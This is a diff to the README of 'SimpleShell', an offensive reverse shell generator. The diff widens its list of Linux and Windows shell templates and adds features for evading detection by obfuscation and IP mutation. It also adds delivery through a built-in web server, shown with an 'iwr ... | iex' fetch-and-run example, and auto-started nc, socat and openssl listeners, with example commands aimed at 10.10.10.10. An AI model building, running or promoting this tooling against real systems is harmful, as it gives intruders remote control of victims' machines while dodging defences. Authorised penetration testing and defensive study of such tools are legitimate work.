@@ -1,35 +1,67 @@
 # SimpleShell
 
-A versatile reverse shell generator that simplifies the process of creating ready-to-use commands for various environments and languages. This tool provides a wide range of templates for both Windows and Linux, including threaded and obfuscated options.
+A versatile reverse shell generator that simplifies the process of creating ready-to-use commands for various environments and languages. This tool provides a wide range of templates for both Windows and Linux, including threaded, encoded, and obfuscated options.
 
 ## Supported Shells
-- **Linux**: Bash, Python3, Perl, PHP, Ruby, Netcat, Socat.
-- **Windows**: PowerShell, Python Threaded, C# Source, MSHTA (VBScript/JScript).
+
+### Linux / Unix
+- **bash**: Standard Bash reverse shell using `/dev/tcp`.
+- **python-linux**: Python3 reverse shell using the `socket` and `os` modules.
+- **perl**: Perl reverse shell using the `Socket` module.
+- **php-linux**: PHP reverse shell using `fsockopen` and file descriptors.
+- **java**: Java reverse shell using `Runtime.getRuntime().exec()`.
+- **ruby**: Ruby reverse shell using `TCPSocket` and `spawn`.
+- **socat**: Advanced Socat reverse shell for stable PTY.
+- **golang**: Golang reverse shell (requires `go` on the target).
+- **ncat**: Standard Ncat reverse shell using the `-e` flag.
+- **openssl**: Encrypted reverse shell using OpenSSL and a FIFO pipe.
+
+### Windows
+- **powershell-tcp**: PowerShell reverse shell using `System.Net.Sockets.TCPClient`.
+- **powershell-enc**: Base64 encoded PowerShell reverse shell.
+- **python-windows**: Threaded Python reverse shell specifically for Windows.
+- **php-windows**: PHP reverse shell using `proc_open` and `cmd.exe`.
 
 ## Features
-- **Multi-Platform Support**: Generates shells for both Windows and Linux systems.
-- **Protocol Variety**: Includes shells for TCP, UDP, and HTTP-based communication.
-- **Interactive Interface**: Provides an easy-to-use CLI to list and generate shells.
-- **Customizable Configuration**: Allows specifying LHOST and LPORT for all generated shells.
+- **Polymorphic Obfuscation**: Uses techniques like environmental slicing, hex-escaping, and backticking to evade static detection.
+- **Built-in Web Server**: Can automatically serve the generated payload via HTTP for easy delivery (e.g., `iwr http://... | iex`).
+- **Integrated Listener**: Option to automatically start a `nc`, `socat`, or `openssl` listener based on the chosen payload.
+- **IP Mutation**: Can represent the listener IP in non-standard formats (like decimal) for additional evasion.
 
 ## Usage
-List all available shells:
+
+### Required Parameters
+- `--ip <IP/IFACE>`: The IP address or network interface (e.g., eth0) of the listener.
+- `--port <PORT>`: The port of the listener.
+- `--type <TYPE>`: The type of reverse shell to generate (see list above).
+
+### General Options
+- `--obfuscate`: Enable polymorphic mutation and obfuscation techniques.
+- `--serve [PORT]`: Start a web server to serve the payload (default port 80).
+- `--listen`: Automatically start the appropriate listener.
+- `--raw`: Output only the raw payload command (useful for piping).
+- `-l, --list`: List all available shell types with descriptions.
+- `-h, --help`: Show the detailed help message.
+
+### Examples
+
+Generate a standard Bash reverse shell:
 ```bash
-python3 simple_shell.py --list
+python3 simple_shell.py --ip 10.10.10.10 --port 443 --type bash
 ```
 
-Generate a PowerShell reverse shell for a specific IP and port:
+Generate an obfuscated PowerShell encoded shell and serve it on port 8080:
 ```bash
-python3 simple_shell.py -t powershell -i 10.10.10.10 -p 443
+python3 simple_shell.py --ip eth0 --port 443 --type powershell-enc --obfuscate --serve 8080
 ```
 
-### Arguments
-- `-t, --type`: The type of shell to generate (bash, python, powershell, etc.).
-- `-i, --ip`: Your local listening IP address.
-- `-p, --port`: Your local listening port.
-- `--list`: Displays all supported shell types and descriptions.
+Generate a Socat shell and automatically start the stable PTY listener:
+```bash
+python3 simple_shell.py --ip 10.10.10.10 --port 4444 --type socat --listen
+```
 
-## Templates
-- **python-windows**: A threaded Python reverse shell specifically for Windows targets.
-- **mshta**: A shell delivered via MSHTA using either VBScript or JScript.
-- **bash-i**: Standard Bash interactive reverse shell.
+## Recommended Listeners
+The tool provides recommendations for listeners, including:
+- Standard: `nc -lvnp <PORT>`
+- Stable PTY: `socat TCP-LISTEN:<PORT>,reuseaddr,fork FILE:`tty`,raw,echo=0`
+- Encrypted: `openssl s_server ...`
